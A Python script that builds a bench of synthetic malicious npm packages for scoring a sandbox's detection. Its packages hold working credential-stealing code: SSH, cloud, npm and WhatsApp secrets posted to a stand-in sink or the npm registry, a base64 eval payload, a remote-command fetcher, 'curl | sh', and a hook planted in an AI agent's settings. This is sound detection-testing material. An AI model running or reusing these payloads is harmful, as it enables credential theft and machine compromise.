#!/usr/bin/env python3
"""Fabrique le banc de sondes : douze paquets synthétiques, un geste par classe.

Le banc sert à noter la sandbox objectivement — « X/12 classes vues ». Un audit
LLM qui propose une amélioration n'est retenu que s'il fait monter ce score sans
faire parler la sonde témoin (P12, propre).

Chaque sonde exfiltre vers un hôte qui n'est PAS le registry : c'est la seule
chose que l'agrégateur compte comme preuve.
"""
import json
import os
import shutil
import sys

# Surchargeables par variables d'environnement (tests) ; les défauts restent ceux du banc.
BASE = os.environ.get("SBX_SONDES_BASE", "/home/bob/q5n2/sondes")
LISTE = os.environ.get("SBX_LISTE", "/home/bob/q5n2/liste_sondes.tsv")
SINK = "https://sink.exfil-probe.test/collect"
REG = "https://registry.npmjs.org/-/v1/security/audits"

SONDES = {
    # 1. le classique : script de cycle de vie
    "p01-postinstall": {
        "scripts": {"postinstall": "node post.js"},
        "files": {"post.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
"""},
    },
    # 2. ESM pur
    "p02-esm": {
        "type": "module",
        "main": "index.js",
        "files": {"index.js": f"""
import https from 'node:https'; import fs from 'node:fs'; import os from 'node:os';
const k = fs.readFileSync(os.homedir()+'/.aws/credentials','utf8');
const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
export const hello=()=>1;
"""},
    },
    # 3. déclenchement différé
    "p03-timer": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
setTimeout(()=>{{
  const k=fs.readFileSync(os.homedir()+'/.gitconfig','utf8');
  const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
}}, 259200000);
module.exports={{}};
"""},
    },
    # 4. uniquement par le bin
    "p04-bin": {
        "bin": {"p04": "./cli.js"},
        "files": {"cli.js": f"""#!/usr/bin/env node
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.kube/config','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
setTimeout(()=>process.exit(0),800);
"""},
    },
    # 5. jeton npm vers un tiers
    "p05-npmrc": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.npmrc','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{}};
"""},
    },
    # 6. config distante puis exécution
    "p06-c2": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),cp=require('child_process');
https.get('https://raw.githubusercontent.com/probe/cfg/main/c2.json',r=>{{
  let d=''; r.on('data',c=>d+=c); r.on('end',()=>{{ try{{ cp.execSync(JSON.parse(d).cmd,{{timeout:3000}}); }}catch(e){{}} }});
}}).on('error',()=>{{}});
module.exports={{}};
"""},
    },
    # 7. exports sans main
    "p07-exports": {
        "exports": {".": {"import": "./esm.mjs", "require": "./cjs.js"}},
        "files": {"cjs.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.docker/config.json','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{ok:1}};
""", "esm.mjs": "export const ok=1;\n"},
    },
    # 8. charge utile évaluée
    "p08-eval": {
        "main": "index.js",
        "files": {"index.js": f"""
const p=Buffer.from("Y29uc3QgaHR0cHM9cmVxdWlyZSgnaHR0cHMnKSxmcz1yZXF1aXJlKCdmcycpLG9zPXJlcXVpcmUoJ29zJyk7Y29uc3Qgaz1mcy5yZWFkRmlsZVN5bmMob3MuaG9tZWRpcigpKycvLmNvbmZpZy9nY2xvdWQvYXBwbGljYXRpb25fZGVmYXVsdF9jcmVkZW50aWFscy5qc29uJywndXRmOCcpO2NvbnN0IHI9aHR0cHMucmVxdWVzdCgnaHR0cHM6Ly9zaW5rLmV4ZmlsLXByb2JlLnRlc3QvY29sbGVjdCcse21ldGhvZDonUE9TVCd9KTtyLndyaXRlKGspO3IuZW5kKCk7",'base64').toString();
eval(p);
module.exports={{}};
"""},
    },
    # 9. shell + réseau
    "p09-shell": {
        "main": "index.js",
        "files": {"index.js": f"""
const cp=require('child_process');
try{{ cp.execSync('curl -s -X POST --data @'+require('os').homedir()+'/.bash_history {SINK}',{{timeout:4000}}); }}catch(e){{}}
module.exports={{}};
"""},
    },
    # 10. hook auto-installé (la preuve est l'écriture de la config cliente)
    "p10-hook": {
        "main": "index.js",
        "files": {"index.js": """
const fs=require('fs'),os=require('os'),path=require('path');
const d=path.join(os.homedir(),'.claude'); fs.mkdirSync(d,{recursive:true});
const h=path.join(d,'h.js');
fs.writeFileSync(h,'module.exports=1;');
fs.writeFileSync(path.join(d,'settings.json'),JSON.stringify({hooks:{PostToolUse:[{matcher:'*',hooks:[{type:'command',command:'node '+h}]}]}}));
module.exports={};
"""},
    },
    # 11. session WhatsApp
    "p11-wa": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/wa-session/creds.json','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{}};
"""},
    },
    # 13. la charge utile est dans `exports`, un index.js benin existe
    "p13-exports-piege": {
        "exports": {".": {"import": "./charge.mjs", "require": "./charge.cjs"}},
        "files": {"index.js": "module.exports={add:(a,b)=>a+b};\n",
                  "charge.cjs": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
module.exports={{version:1}};
""", "charge.mjs": "export const version=1;\n"},
    },
    # 19. DECOUPAGE : aucun fichier ne contient lecture + destination
    "p19-split": {
        "main": "index.js",
        "files": {
            "index.js": "const {lire}=require('./lib/collect');\nconst {envoyer}=require('./lib/wire');\nenvoyer(lire());\n",
            "lib/collect.js": "const fs=require('fs'),os=require('os');\nmodule.exports={lire:()=>fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')};\n",
            "lib/wire.js": "const https=require('https');\nmodule.exports={envoyer:(x)=>{const r=https.request('https://sink.exfil-probe.test/collect',{method:'POST'});r.write(x);r.end();}};\n",
        },
    },
    # 20. l hote vient de ~/.npmrc : aucune URL litterale dans le paquet
    "p20-endpoint-npmrc": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
let hote='registry.npmjs.org';
try {{
  const rc=fs.readFileSync(os.homedir()+'/.npmrc','utf8');
  const m=rc.match(/^@corp:registry\s*=\s*https?:\/\/([^\/\s]+)/m); if (m) hote=m[1];
}} catch (e) {{}}
const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
const r=https.request('https://'+hote+'/-/v1/audit',{{method:'POST'}}); r.write(k); r.end();
module.exports=1;
"""},
    },
    # 18. exfiltre l environnement EN BASE64 : aucun canari en clair sur le reseau
    "p18-base64": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https');
const fs=require('fs'),os=require('os');
const b = Buffer.from(fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
const r = https.request('{REG}b64', {{method:'POST'}});
r.write(b); r.end();
module.exports=1;
"""},
    },
    # 18b/18c. base64 DECALE : le contenu lu est prefixe de 1 puis 2 octets AVANT le
    # base64. p18 est aligne a 0 (en-tete de 36 octets = multiple de 3) : il ne
    # discrimine pas le correctif d'alignement du matcher.
    "p18b-base64-decal1": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https');
const fs=require('fs'),os=require('os');
const b = Buffer.from('x'+fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
const r = https.request('{REG}b64', {{method:'POST'}});
r.write(b); r.end();
module.exports=1;
"""},
    },
    "p18c-base64-decal2": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https');
const fs=require('fs'),os=require('os');
const b = Buffer.from('xy'+fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
const r = https.request('{REG}b64', {{method:'POST'}});
r.write(b); r.end();
module.exports=1;
"""},
    },
    # 22. cle SSH EN CLAIR vers le registry : seule la regle « canari SSH vers le
    # registry » peut la rendre CLÉ (le jeton npm, lui, y est un usage normal).
    "p22-registry-ssh": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
const r=https.request('{REG}',{{method:'POST'}}); r.write(k); r.end();
module.exports=1;
"""},
    },
    # 21. LEURRE ORPHELIN : injection de faute. Un processus detache survit a la
    # sonde (boucle sh de 600 s qui relance leurre.js). Si l'isolation entre sondes
    # est cassee, la sonde SUIVANTE voit l'hote leurre.exfil-probe.test.
    "p21-leurre-orphelin": {
        "main": "index.js",
        "files": {"index.js": """
const cp=require('child_process');
try{
  const c=cp.spawn('sh',['-c','i=0; while [ $i -lt 600 ]; do node leurre.js; sleep 1; i=$((i+1)); done'],{detached:true,stdio:'ignore',cwd:__dirname});
  c.unref();
}catch(e){}
module.exports=1;
""", "leurre.js": """
const https=require('https'),fs=require('fs'),os=require('os');
try{
  const k=fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
  const r=https.request('https://leurre.exfil-probe.test/orphelin',{method:'POST'});
  r.on('error',()=>{});
  r.write(k); r.end();
}catch(e){}
"""},
    },
    # 23. ne frappe QUE si une fonction EXPORTEE est appelee avec une session (piloter()).
    # Aucune action au chargement, aucun require.main : c'est la seule sonde qui mesure la
    # fenetre d'observation de run-entry. Muette avec l'ancien run-entry (plafond 1,5 s :
    # piloter() jamais appele), CLE avec le correctif v3. Sans elle, une regression de
    # B-OBS passe inapercue sur le banc (aucune des 24 autres ne depend de piloter()).
    "p23-export-pilote": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https');
function makeWASocket(dossier, opts) {{
  try {{
    const c = JSON.stringify((opts && opts.auth && opts.auth.creds) || {{}});
    const r = https.request('{SINK}', {{method:'POST'}}); r.on('error',()=>{{}}); r.write(c); r.end();
  }} catch (e) {{}}
  return {{}};
}}
module.exports = {{ makeWASocket }};
"""},
    },
    # 17. tente un binaire absent (curl) : l echec doit etre un signal
    "p17-bin-absent": {
        "main": "index.js",
        "scripts": {"postinstall": "curl -s http://sink.exfil-probe.test/h | sh"},
        "files": {"index.js": "module.exports=1;\n"},
    },
    # 16. ne frappe QUE si execute comme module d entree (require.main === module)
    "p16-main-module": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
// Rien d'exporte : si le harnais ne nous execute pas comme module d entree,
// cette sonde DOIT rester muette (le pilote ne doit pas pouvoir la declencher via ses exports).
if (require.main === module) {{
  const k = fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
  const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
}}
module.exports={{}};
"""},
    },
    # 15. ne frappe que si 30 jours se sont ecoules (horloge decalee)
    "p15-horloge": {
        "main": "index.js",
        "files": {"index.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const INSTALLE = Number(process.env.SBX_INSTALLE_MS || 0);
const ecoule = INSTALLE ? (Date.now() - INSTALLE) : 0;
if (ecoule > 30 * 86400000) {{
  const k = fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8');
  const r = https.request('{SINK}', {{method:'POST'}}); r.write(k); r.end();
}}
module.exports={{ecoule}};
"""},
    },
    # 12. témoin : doit rester muet
    "p12-propre": {
        "main": "index.js",
        "files": {"index.js": """
const path=require('path');
module.exports={ add:(a,b)=>a+b, chemin:p=>path.join(__dirname,p) };
"""},
    },
}


SONDES["p14-dep-postinstall"] = {
    "main": "index.js",
    "dependencies": {"sonde-dep": "file:./dep"},
    "files": {"index.js": "module.exports={ok:1};\n"},
    "dep": {"name": "sonde-dep", "version": "1.0.0",
            "scripts": {"postinstall": "node post.js"},
            "files": {"post.js": f"""
const https=require('https'),fs=require('fs'),os=require('os');
const k=fs.readFileSync(os.homedir()+'/.gitconfig','utf8');
const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
"""}},
}


# Classe attendue par sonde (le banc tourne avec SBX_OFFSET_JOURS=30) :
#  "—"              le temoin p12-propre doit rester muet ;
#  "INTENTION"      curl/git/bash sont absents de l'image : p09 et p17 ne prouvent qu'une intention ;
#  "CONTRÔLE-LEURRE" p21 : controle d'isolation, jamais compte comme detection ;
#  "CLÉ"            toutes les autres.
CLASSES_ATTENDUES = {"p12-propre": "—", "p09-shell": "INTENTION", "p17-bin-absent": "INTENTION",
                     "p21-leurre-orphelin": "CONTRÔLE-LEURRE"}
for _nom, _d in SONDES.items():
    _d["attendu"] = CLASSES_ATTENDUES.get(_nom, "CLÉ")


def rang(nom):
    """Ordre de fin de liste : le leurre p21 AVANT-DERNIER, le temoin p12 DERNIER
    (le temoin suit le leurre : un orphelin qui survit le salirait)."""
    if nom.startswith("p12-"):
        return 2
    if nom.startswith("p21-"):
        return 1
    return 0


def fabrique():
    shutil.rmtree(BASE, ignore_errors=True)
    os.makedirs(BASE)
    lignes = []
    noms = sorted(SONDES, key=lambda n: rang(n))  # tri stable : l'ordre d'insertion est garde
    for nom in noms:
        d = SONDES[nom]
        racine = os.path.join(BASE, nom, "package")
        os.makedirs(racine)
        pkg = {"name": nom, "version": "1.0.0", "description": "sonde de banc"}
        if "type" in d:
            pkg["type"] = d["type"]
        if "main" in d:
            pkg["main"] = d["main"]
        if "exports" in d:
            pkg["exports"] = d["exports"]
        if "bin" in d:
            pkg["bin"] = d["bin"]
        if "scripts" in d:
            pkg["scripts"] = d["scripts"]
        with open(os.path.join(racine, "package.json"), "w") as f:
            json.dump(pkg, f, indent=2)
        for rel, contenu in d["files"].items():
            p = os.path.join(racine, rel)
            os.makedirs(os.path.dirname(p), exist_ok=True) if os.path.dirname(p) != racine else None
            open(p, "w").write(contenu.lstrip("\n"))
        if "dependencies" in d:
            pkg["dependencies"] = d["dependencies"]
            json.dump(pkg, open(os.path.join(racine, "package.json"), "w"), indent=2)
        if "dep" in d:
            dep = os.path.join(racine, "dep")
            os.makedirs(dep, exist_ok=True)
            json.dump({"name": d["dep"]["name"], "version": d["dep"]["version"],
                       "scripts": d["dep"]["scripts"]}, open(os.path.join(dep, "package.json"), "w"), indent=2)
            for rel, contenu in d["dep"]["files"].items():
                open(os.path.join(dep, rel), "w").write(contenu.lstrip("\n"))
        # tarball au format npm
        import subprocess
        tgz = os.path.join(BASE, nom + ".tgz")
        subprocess.run(["tar", "czf", tgz, "-C", os.path.dirname(racine), "package"], check=True)
        lignes.append(f"{nom}\t{tgz}")
    # Le temoin doit toujours etre la DERNIERE sonde : la verification « muet »
    # cherche alors le dernier tag, quel que soit le nombre de sondes ajoutees.
    # (L'ordre est deja garanti par rang() ci-dessus.)
    with open(os.path.join(BASE, "attendus.json"), "w", encoding="utf-8") as f:
        json.dump({n: SONDES[n]["attendu"] for n in noms}, f, ensure_ascii=False, indent=1)
    open(LISTE, "w").write("\n".join(lignes) + "\n")
    print(f"{len(lignes)} sondes fabriquées ; liste {LISTE}")


if __name__ == "__main__":
    fabrique()
